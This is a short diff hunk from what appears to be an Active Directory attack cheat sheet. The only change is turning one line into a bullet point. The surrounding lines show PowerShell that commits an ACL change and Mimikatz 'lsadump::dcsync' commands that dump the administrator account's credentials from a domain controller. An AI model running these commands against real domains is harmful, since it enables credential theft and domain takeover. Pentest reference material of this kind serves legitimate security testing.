@@ -97,7 +97,7 @@ $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
 8. DCSync Attack 
-The user running the command must have Replicating Directory Changes permissions in Active Directory. This is typically assigned to domain admins or equivalent privileged accounts.
+- The user running the command must have Replicating Directory Changes permissions in Active Directory. This is typically assigned to domain admins or equivalent privileged accounts.
 ```bash
 lsadump::dcsync /domain:<Domain> /user:<User>
 lsadump::dcsync /domain:example.com /user:administrator
